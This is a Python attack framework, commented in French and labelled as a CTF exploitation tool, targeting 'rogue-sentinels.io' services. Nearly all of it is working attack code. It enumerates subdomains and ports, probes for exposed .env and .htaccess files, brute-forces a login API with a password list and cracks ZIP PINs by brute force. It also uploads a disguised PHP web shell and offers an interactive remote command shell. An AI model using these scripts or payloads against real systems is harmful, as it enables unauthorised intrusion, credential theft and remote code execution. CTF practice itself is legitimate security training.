#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘           ROGUE SENTINELS - CTF EXPLOITATION FRAMEWORK v2                    â•‘
â•‘                   Full Pentest Methodology - Groupe F                        â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Script d'exploitation complet suivant la mÃ©thodologie pentest:
1. Reconnaissance DNS (sous-domaines)
2. Scan de ports (Nmap)
3. EnumÃ©ration (Gobuster/Dirbuster)
4. Exploitation spÃ©cifique Ã  chaque vulnÃ©rabilitÃ©
"""

import os
import sys
import time
import requests
import subprocess
import socket
import zipfile
import base64
import re
import io
import json
import tempfile
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, quote

# DÃ©sactiver les warnings SSL
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# COULEURS ET UTILITAIRES
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def banner():
    print(f"""{Colors.CYAN}
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—  â•‘
â•‘  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â• â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•    â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘  â•‘
â•‘  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—      â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘  â•‘
â•‘  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•      â•šâ•â•â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â•‘
â•‘  â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘  â•‘
â•‘  â•šâ•â•  â•šâ•â• â•šâ•â•â•â•â•â•  â•šâ•â•â•â•â•â•  â•šâ•â•â•â•â•â• â•šâ•â•â•â•â•â•â•    â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•â•  â•‘
â•‘                                                                              â•‘
â•‘            CTF FULL PENTEST FRAMEWORK v2.0 - Groupe F                        â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
{Colors.ENDC}""")

def print_success(msg): print(f"{Colors.GREEN}[+] {msg}{Colors.ENDC}")
def print_error(msg): print(f"{Colors.RED}[-] {msg}{Colors.ENDC}")
def print_info(msg): print(f"{Colors.BLUE}[*] {msg}{Colors.ENDC}")
def print_warning(msg): print(f"{Colors.YELLOW}[!] {msg}{Colors.ENDC}")
def print_flag(flag):
    print(f"\n{Colors.GREEN}{Colors.BOLD}{'='*60}")
    print(f"  ğŸš© FLAG CAPTURÃ‰: {flag}")
    print(f"{'='*60}{Colors.ENDC}\n")

def print_section(title):
    print(f"\n{Colors.HEADER}{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}{Colors.ENDC}\n")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def pause():
    input(f"\n{Colors.CYAN}Appuyez sur EntrÃ©e pour continuer...{Colors.ENDC}")

def run_command(cmd, timeout=60):
    """ExÃ©cuter une commande shell et retourner le rÃ©sultat"""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "TIMEOUT"
    except Exception as e:
        return f"ERROR: {e}"

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# WORDLISTS INTÃ‰GRÃ‰ES
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

COMMON_SUBDOMAINS = """fileserver
travel
restricted
staging
webservices
admin
api
mail
ftp
ssh
vpn
dev
test
beta
alpha
www
portal
intranet
extranet
backup
db
database
mysql
postgres
redis
mongo
elastic
kibana
grafana
prometheus
jenkins
gitlab
github
bitbucket
jira
confluence
wiki
docs
blog
shop
store
cart
pay
payment
billing
crm
erp
hr
finance
accounting
sales
marketing
support
help
ticket
monitor
status
health
metrics
logs
cdn
static
assets
media
images
files
uploads
downloads
""".strip().split('\n')

COMMON_PASSWORDS = [
    "admin", "password", "admin123", "security", "Security123", 
    "web2000", "Web2000!", "root", "toor", "123456", "password123",
    "letmein", "welcome", "monkey", "dragon", "master", "qwerty",
    "login", "pass", "test", "guest", "changeme", "secret"
]

COMMON_URLS = [
    ".htaccess", ".htpasswd", "robots.txt", ".git/config", ".env",
    "config.php", "config.js", "config.json", "settings.php",
    "admin", "administrator", "login", "wp-admin", "phpmyadmin",
    "backup", "backups", "db", "database", "api", "api/v1",
    "uploads", "files", "images", "photos", "documents"
]

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# PHASE 0: RECONNAISSANCE INITIALE
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Reconnaissance:
    """Phase de reconnaissance: DNS, ports, services"""
    
    def __init__(self, base_domain="rogue-sentinels.io"):
        self.base_domain = base_domain
        self.discovered_subdomains = []
        self.discovered_services = {}
        
    def run_full_recon(self):
        """ExÃ©cuter la reconnaissance complÃ¨te"""
        clear_screen()
        print_section("PHASE 0: RECONNAISSANCE INITIALE")
        
        print_info(f"Cible: {self.base_domain}")
        
        # Ã‰tape 1: EnumÃ©ration DNS
        print_info("\n[1/3] EnumÃ©ration des sous-domaines...")
        self.enumerate_subdomains()
        
        # Ã‰tape 2: Scan de ports
        print_info("\n[2/3] Scan des ports...")
        self.scan_ports()
        
        # Ã‰tape 3: Identification des services
        print_info("\n[3/3] Identification des services...")
        self.identify_services()
        
        # RÃ©sumÃ©
        self.print_summary()
        
        return self.discovered_services
    
    def enumerate_subdomains(self):
        """Trouver les sous-domaines actifs"""
        print_info(f"Test de {len(COMMON_SUBDOMAINS)} sous-domaines...")
        
        found = []
        
        for subdomain in COMMON_SUBDOMAINS:
            fqdn = f"{subdomain}.{self.base_domain}"
            
            # Test DNS
            try:
                ip = socket.gethostbyname(fqdn)
                print_success(f"{fqdn} -> {ip}")
                found.append({'subdomain': subdomain, 'fqdn': fqdn, 'ip': ip})
            except socket.gaierror:
                pass
        
        # Test aussi le domaine principal
        try:
            ip = socket.gethostbyname(self.base_domain)
            print_success(f"{self.base_domain} -> {ip}")
            found.append({'subdomain': '', 'fqdn': self.base_domain, 'ip': ip})
        except:
            pass
        
        self.discovered_subdomains = found
        print_info(f"\nTotal: {len(found)} sous-domaines trouvÃ©s")
        
        return found
    
    def scan_ports(self):
        """Scanner les ports sur chaque sous-domaine"""
        
        # Ports courants Ã  scanner
        common_ports = [21, 22, 80, 443, 3000, 5000, 8000, 8080, 8443, 9000, 
                       19480, 64375]  # Ports spÃ©cifiques au CTF
        
        for entry in self.discovered_subdomains:
            fqdn = entry['fqdn']
            ip = entry['ip']
            
            print_info(f"\nScan de {fqdn} ({ip})...")
            
            open_ports = []
            
            # Essayer nmap si disponible
            nmap_result = run_command(f"nmap -p- --min-rate=1000 -T4 {ip} 2>/dev/null | grep ^[0-9]", timeout=120)
            
            if "open" in nmap_result:
                # Parser les rÃ©sultats nmap
                for line in nmap_result.split('\n'):
                    if 'open' in line:
                        port = line.split('/')[0]
                        try:
                            open_ports.append(int(port))
                            print_success(f"  Port {port}: ouvert")
                        except:
                            pass
            else:
                # Fallback: scan manuel des ports courants
                for port in common_ports:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        result = sock.connect_ex((ip, port))
                        sock.close()
                        
                        if result == 0:
                            open_ports.append(port)
                            print_success(f"  Port {port}: ouvert")
                    except:
                        pass
            
            entry['ports'] = open_ports
    
    def identify_services(self):
        """Identifier les services sur chaque port"""
        
        for entry in self.discovered_subdomains:
            fqdn = entry['fqdn']
            subdomain = entry['subdomain']
            
            for port in entry.get('ports', []):
                service_key = f"{subdomain}:{port}" if subdomain else f"main:{port}"
                
                # Tester HTTP/HTTPS
                for protocol in ['http', 'https']:
                    url = f"{protocol}://{fqdn}:{port}"
                    try:
                        r = requests.get(url, timeout=5, verify=False)
                        
                        # Identifier le service
                        service_info = {
                            'url': url,
                            'fqdn': fqdn,
                            'port': port,
                            'protocol': protocol,
                            'status': r.status_code,
                            'title': '',
                            'server': r.headers.get('Server', ''),
                            'technology': []
                        }
                        
                        # Extraire le titre
                        title_match = re.search(r'<title>([^<]+)</title>', r.text, re.I)
                        if title_match:
                            service_info['title'] = title_match.group(1)
                        
                        # Identifier les technologies
                        if 'geoserver' in r.text.lower():
                            service_info['technology'].append('GeoServer')
                        if 'upload' in r.text.lower():
                            service_info['technology'].append('FileUpload')
                        if 'login' in r.text.lower() or 'auth' in r.text.lower():
                            service_info['technology'].append('Authentication')
                        if 'calculator' in r.text.lower() or 'adder' in r.text.lower():
                            service_info['technology'].append('Calculator')
                        
                        self.discovered_services[service_key] = service_info
                        print_success(f"  {url} - {service_info['title'] or 'No title'}")
                        break  # Si HTTP marche, pas besoin de tester HTTPS
                        
                    except:
                        pass
    
    def print_summary(self):
        """Afficher le rÃ©sumÃ© de la reconnaissance"""
        print_section("RÃ‰SUMÃ‰ DE LA RECONNAISSANCE")
        
        print(f"{Colors.BOLD}Sous-domaines dÃ©couverts:{Colors.ENDC}")
        for entry in self.discovered_subdomains:
            ports_str = ', '.join(map(str, entry.get('ports', [])))
            print(f"  â€¢ {entry['fqdn']} ({entry['ip']}) - Ports: {ports_str or 'aucun'}")
        
        print(f"\n{Colors.BOLD}Services identifiÃ©s:{Colors.ENDC}")
        for key, service in self.discovered_services.items():
            tech_str = ', '.join(service['technology']) if service['technology'] else 'Unknown'
            print(f"  â€¢ {service['url']}")
            print(f"    Title: {service['title'] or 'N/A'}")
            print(f"    Tech: {tech_str}")
            print()


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# VULNÃ‰RABILITÃ‰ #1: FileServer - Bruteforce + ZIP Cracking
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Exploit1_FileServer:
    """
    Exploitation du FileServer:
    1. EnumÃ©ration des fichiers sensibles (.htaccess)
    2. Bruteforce de l'authentification
    3. Exploration du filesystem
    4. TÃ©lÃ©chargement et bruteforce des ZIP
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.base_url = None
        self.email = None
        self.password = None
        self.token = None
        
    def run(self):
        clear_screen()
        print_section("EXPLOIT #1: FileServer - Bruteforce + ZIP Cracking")
        
        # Configuration
        print_info("Configuration du service:")
        host = input(f"{Colors.CYAN}Host (dÃ©faut: fileserver.rogue-sentinels.io): {Colors.ENDC}") or "fileserver.rogue-sentinels.io"
        port = input(f"{Colors.CYAN}Port (dÃ©faut: 8080): {Colors.ENDC}") or "8080"
        self.base_url = f"http://{host}:{port}"
        
        print_info(f"Cible: {self.base_url}")
        
        # Mode d'exploitation
        print_info("\nOptions:")
        print("  [1] Exploitation complÃ¨te (enumÃ©ration â†’ bruteforce â†’ extraction)")
        print("  [2] Injection directe du token JWT")
        mode = input(f"{Colors.CYAN}Choix (1/2): {Colors.ENDC}") or "1"
        
        if mode == "2":
            self.token = input(f"{Colors.YELLOW}Token JWT: {Colors.ENDC}").strip()
            self.session.headers['Authorization'] = f"Bearer {self.token}"
            # Aussi en cookie pour compatibilitÃ©
            self.session.cookies.set('token', self.token)
        else:
            # Ã‰tape 1: EnumÃ©ration
            print_info("\n[Ã‰tape 1] EnumÃ©ration des fichiers sensibles...")
            self.enumerate_files()
            
            # Ã‰tape 2: Bruteforce password
            print_info("\n[Ã‰tape 2] Bruteforce de l'authentification...")
            if not self.bruteforce_auth():
                print_error("Ã‰chec du bruteforce")
                manual_pass = input(f"{Colors.YELLOW}Mot de passe manuel: {Colors.ENDC}")
                if manual_pass:
                    self.password = manual_pass
                    self.authenticate()
        
        # Ã‰tape 3: Exploration du filesystem
        print_info("\n[Ã‰tape 3] Exploration du filesystem...")
        zip_files = self.explore_filesystem()
        
        # Ã‰tape 4: TÃ©lÃ©chargement et crack des ZIP
        print_info("\n[Ã‰tape 4] TÃ©lÃ©chargement et crack des ZIP...")
        flag = self.crack_zips(zip_files)
        
        if flag:
            print_flag(flag)
        else:
            print_error("Flag non trouvÃ©")
        
        pause()
        return flag
    
    def enumerate_files(self):
        """Chercher les fichiers sensibles exposÃ©s"""
        
        sensitive_files = ['.htaccess', '.htpasswd', 'robots.txt', '.git/config', 
                         '.env', 'config.php', 'config.json']
        
        for file in sensitive_files:
            try:
                r = self.session.get(f"{self.base_url}/{file}", timeout=5)
                if r.status_code == 200 and len(r.text) > 0:
                    print_success(f"Fichier trouvÃ©: {file}")
                    print_info(f"Contenu:\n{r.text[:500]}")
                    
                    # Chercher des emails
                    emails = re.findall(r'[\w\.-]+@[\w\.-]+\.\w+', r.text)
                    if emails:
                        self.email = emails[0]
                        print_success(f"Email trouvÃ©: {self.email}")
            except:
                pass
        
        if not self.email:
            self.email = input(f"{Colors.YELLOW}Email (dÃ©faut: security-admin@web2000-corp.com): {Colors.ENDC}") or "security-admin@web2000-corp.com"
    
    def bruteforce_auth(self):
        """Bruteforce du mot de passe"""
        
        # Mots de passe du toolkit
        passwords = ["admin", "password", "admin123", "security", "Security123", 
                    "web2000", "Web2000!"] + COMMON_PASSWORDS
        
        print_info(f"Email cible: {self.email}")
        print_info(f"Test de {len(passwords)} mots de passe...")
        
        for pwd in passwords:
            try:
                data = {"email": self.email, "password": pwd}
                r = self.session.post(f"{self.base_url}/api/v1/auth", json=data, timeout=5)
                
                if r.status_code == 200:
                    try:
                        resp = r.json()
                        if 'token' in resp:
                            self.password = pwd
                            self.token = resp['token']
                            self.session.headers['Authorization'] = f"Bearer {self.token}"
                            self.session.cookies.set('token', self.token)
                            print_success(f"Mot de passe trouvÃ©: {pwd}")
                            print_success(f"Token: {self.token[:50]}...")
                            return True
                    except:
                        pass
            except:
                pass
        
        return False
    
    def authenticate(self):
        """S'authentifier avec les credentials"""
        try:
            data = {"email": self.email, "password": self.password}
            r = self.session.post(f"{self.base_url}/api/v1/auth", json=data, timeout=5)
            
            if r.status_code == 200:
                resp = r.json()
                if 'token' in resp:
                    self.token = resp['token']
                    self.session.headers['Authorization'] = f"Bearer {self.token}"
                    self.session.cookies.set('token', self.token)
                    print_success(f"Authentification rÃ©ussie!")
                    return True
        except Exception as e:
            print_error(f"Erreur: {e}")
        
        return False
    
    def explore_filesystem(self):
        """Explorer le filesystem pour trouver les backups"""
        
        zip_files = []
        
        # Endpoints Ã  tester
        endpoints = [
            '/api/v1/folder?folder=',
            '/api/v1/folder?folder=backups',
            '/api/v1/folder?folder=backup',
            '/api/v1/folder?folder=files',
        ]
        
        for endpoint in endpoints:
            try:
                r = self.session.get(f"{self.base_url}{endpoint}", timeout=5)
                
                if r.status_code == 200:
                    print_success(f"Endpoint accessible: {endpoint}")
                    print_info(f"RÃ©ponse: {r.text[:200]}")
                    
                    # Chercher des fichiers ZIP
                    zip_matches = re.findall(r'[\w\-\_\.]+\.zip', r.text)
                    for z in zip_matches:
                        if z not in zip_files:
                            zip_files.append(z)
                            print_info(f"  ZIP: {z}")
                    
                    # Parser JSON
                    try:
                        data = r.json()
                        if isinstance(data, list):
                            for item in data:
                                if isinstance(item, str) and item.endswith('.zip'):
                                    if item not in zip_files:
                                        zip_files.append(item)
                    except:
                        pass
            except:
                pass
        
        # Si aucun ZIP trouvÃ©, gÃ©nÃ©ration manuelle
        if not zip_files:
            print_warning("Aucun ZIP trouvÃ©. GÃ©nÃ©ration de la liste...")
            print_info("Commande curl pour explorer:")
            print(f"{Colors.CYAN}curl -b 'token={self.token}' '{self.base_url}/api/v1/folder?folder=backups'{Colors.ENDC}")
            
            pattern = input(f"{Colors.YELLOW}Pattern ZIP (dÃ©faut: backup_2001_): {Colors.ENDC}") or "backup_2001_"
            start = int(input(f"{Colors.YELLOW}DÃ©but (dÃ©faut: 124): {Colors.ENDC}") or "124")
            end = int(input(f"{Colors.YELLOW}Fin (dÃ©faut: 350): {Colors.ENDC}") or "350")
            
            for i in range(start, end + 1):
                zip_files.append(f"{pattern}{i}.zip")
        
        print_info(f"\nTotal: {len(zip_files)} fichiers ZIP Ã  traiter")
        return zip_files
    
    def download_zip(self, filename):
        """TÃ©lÃ©charger un fichier ZIP"""
        
        urls = [
            f"{self.base_url}/api/v1/download?file={filename}",
            f"{self.base_url}/api/v1/file?file={filename}",
            f"{self.base_url}/api/v1/files/{filename}",
        ]
        
        for url in urls:
            try:
                r = self.session.get(url, timeout=10)
                if r.status_code == 200 and len(r.content) > 100:
                    # VÃ©rifier magic bytes
                    if r.content[:2] == b'PK':
                        return r.content
            except:
                pass
        
        return None
    
    def crack_zip(self, zip_content, filename):
        """Bruteforce le PIN 4 chiffres"""
        
        try:
            zip_buffer = io.BytesIO(zip_content)
            
            # Tester PINs de 1000 Ã  9999
            for pin in range(1000, 10000):
                pin_str = str(pin)
                
                try:
                    with zipfile.ZipFile(zip_buffer, 'r') as zf:
                        zf.setpassword(pin_str.encode())
                        
                        for name in zf.namelist():
                            try:
                                content = zf.read(name)
                                content_str = content.decode('utf-8', errors='ignore')
                                
                                # Flag trouvÃ©?
                                if 'FLAG' in content_str or 'flag' in content_str.lower():
                                    print_success(f"PIN trouvÃ©: {pin_str}")
                                    return pin_str, content_str
                                
                                # Si on peut lire, c'est le bon PIN
                                print_success(f"PIN trouvÃ©: {pin_str}")
                                return pin_str, content_str
                            except RuntimeError:
                                # Mauvais mot de passe
                                break
                            except:
                                break
                except:
                    pass
                
                zip_buffer.seek(0)
                
                if pin % 1000 == 0:
                    print(f"  Testing PIN: {pin}...", end='\r')
                    
        except Exception as e:
            print_error(f"Erreur: {e}")
        
        return None, None
    
    def crack_zips(self, zip_files):
        """TÃ©lÃ©charger et cracker tous les ZIP"""
        
        for filename in zip_files:
            print_info(f"Traitement: {filename}")
            
            # TÃ©lÃ©charger
            content = self.download_zip(filename)
            if not content:
                continue
            
            print_success(f"  TÃ©lÃ©chargÃ©: {len(content)} bytes")
            
            # Cracker
            pin, file_content = self.crack_zip(content, filename)
            
            if pin and file_content:
                # Chercher le flag
                flag_match = re.search(r'FLAG[_\-\w]+', file_content, re.I)
                if flag_match:
                    return flag_match.group(0)
                
                # Afficher le contenu
                print_info(f"Contenu:\n{file_content[:500]}")
                
                user_flag = input(f"{Colors.YELLOW}Flag trouvÃ©? (copier ou EntrÃ©e): {Colors.ENDC}")
                if user_flag:
                    return user_flag
        
        return None


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# VULNÃ‰RABILITÃ‰ #2: Travel - File Upload RCE
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Exploit2_Travel:
    """
    Exploitation de Travel via File Upload:
    1. Upload d'un shell PHP dÃ©guisÃ© (.png.php)
    2. AccÃ¨s au shell
    3. Recherche du flag
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.base_url = None
        self.shell_url = None
        
    def run(self):
        clear_screen()
        print_section("EXPLOIT #2: Travel - File Upload RCE")
        
        # Configuration
        host = input(f"{Colors.CYAN}Host (dÃ©faut: travel.rogue-sentinels.io): {Colors.ENDC}") or "travel.rogue-sentinels.io"
        port = input(f"{Colors.CYAN}Port (dÃ©faut: 80): {Colors.ENDC}") or "80"
        self.base_url = f"http://{host}:{port}"
        
        print_info(f"Cible: {self.base_url}")
        
        # Ã‰tape 1: Reconnaissance
        print_info("\n[Ã‰tape 1] Reconnaissance...")
        self.recon()
        
        # Ã‰tape 2: Upload du shell
        print_info("\n[Ã‰tape 2] Upload du shell PHP...")
        if not self.upload_shell():
            print_warning("Upload automatique Ã©chouÃ©")
            print_info("Upload manuel:")
            print(f"{Colors.CYAN}curl -X POST {self.base_url}/photos.php -F file=@shell.png.php{Colors.ENDC}")
            input(f"{Colors.YELLOW}Appuyez sur EntrÃ©e aprÃ¨s l'upload manuel...{Colors.ENDC}")
        
        # Ã‰tape 3: Trouver le shell
        print_info("\n[Ã‰tape 3] Localisation du shell...")
        if not self.find_shell():
            self.shell_url = input(f"{Colors.YELLOW}URL du shell: {Colors.ENDC}")
        
        # Ã‰tape 4: Exploitation
        print_info("\n[Ã‰tape 4] Recherche du flag...")
        flag = self.find_flag()
        
        if flag:
            print_flag(flag)
        
        # Shell interactif
        self.interactive_shell()
        
        pause()
        return flag
    
    def recon(self):
        """Reconnaissance de l'application"""
        try:
            r = self.session.get(self.base_url, timeout=10)
            print_success(f"Application accessible (Status: {r.status_code})")
            
            # Identifier l'application
            if 'salmon' in r.text.lower():
                print_info("Application: The Happy Salmon")
            if 'upload' in r.text.lower() or 'photo' in r.text.lower():
                print_success("FonctionnalitÃ© d'upload dÃ©tectÃ©e")
            
            # Chercher les endpoints
            forms = re.findall(r'action=["\']([^"\']+)["\']', r.text)
            for form in forms:
                print_info(f"Formulaire: {form}")
                
        except Exception as e:
            print_error(f"Erreur: {e}")
    
    def upload_shell(self):
        """Upload du shell PHP"""
        
        # Shell PHP simple
        shell_content = b'<?php system($_REQUEST["cmd"]); ?>'
        
        # Endpoint d'upload (from toolkit)
        upload_url = f"{self.base_url}/photos.php"
        
        # DiffÃ©rentes techniques
        attempts = [
            ('shell.png.php', 'image/png'),
            ('shell.php.png', 'image/png'),
            ('shell.phtml', 'image/png'),
            ('shell.php', 'application/x-php'),
        ]
        
        for filename, mimetype in attempts:
            try:
                files = {'file': (filename, shell_content, mimetype)}
                r = self.session.post(upload_url, files=files, timeout=10)
                
                if r.status_code == 200:
                    if 'error' not in r.text.lower() and 'invalid' not in r.text.lower():
                        print_success(f"Shell uploadÃ©: {filename}")
                        self.shell_filename = filename
                        return True
                    else:
                        print_warning(f"{filename}: RejetÃ©")
            except Exception as e:
                print_error(f"Erreur upload: {e}")
        
        return False
    
    def find_shell(self):
        """Trouver le shell uploadÃ©"""
        
        # RÃ©pertoires courants
        dirs = ['/salmon-uploads/', '/uploads/', '/images/', '/photos/', 
                '/pictures/', '/img/', '/files/']
        
        filename = getattr(self, 'shell_filename', 'shell.png.php')
        
        for d in dirs:
            url = f"{self.base_url}{d}{filename}"
            try:
                r = self.session.get(url, timeout=5)
                if r.status_code == 200:
                    # Tester si le shell fonctionne
                    test_url = f"{url}?cmd=id"
                    test_r = self.session.get(test_url, timeout=5)
                    if 'uid=' in test_r.text or 'www-data' in test_r.text:
                        print_success(f"Shell trouvÃ©: {url}")
                        self.shell_url = url
                        return True
            except:
                pass
        
        return False
    
    def exec_cmd(self, cmd):
        """ExÃ©cuter une commande via le shell"""
        try:
            r = self.session.get(f"{self.shell_url}?cmd={quote(cmd)}", timeout=10)
            return r.text
        except:
            return None
    
    def find_flag(self):
        """Rechercher le flag"""
        
        commands = [
            "grep -r 'FLAG' /var/www/ 2>/dev/null | head -10",
            "cat /var/www/html/reservations.php 2>/dev/null | grep -i flag",
            "find /var/www -name '*.php' -exec grep -l FLAG {} \\; 2>/dev/null",
            "cat /var/www/html/*.php 2>/dev/null",
        ]
        
        for cmd in commands:
            print_info(f"ExÃ©cution: {cmd}")
            result = self.exec_cmd(cmd)
            
            if result:
                # Chercher un flag
                flag_match = re.search(r'FLAG[_\-\w]+', result, re.I)
                if flag_match:
                    return flag_match.group(0)
                
                if 'flag' in result.lower():
                    print(result[:500])
        
        return None
    
    def interactive_shell(self):
        """Shell interactif"""
        print_info("\n=== Shell Interactif (tapez 'exit' pour quitter) ===")
        
        while True:
            cmd = input(f"{Colors.GREEN}shell> {Colors.ENDC}")
            if cmd.lower() == 'exit':
                break
            if cmd:
                result = self.exec_cmd(cmd)
                if result:
                    print(result)


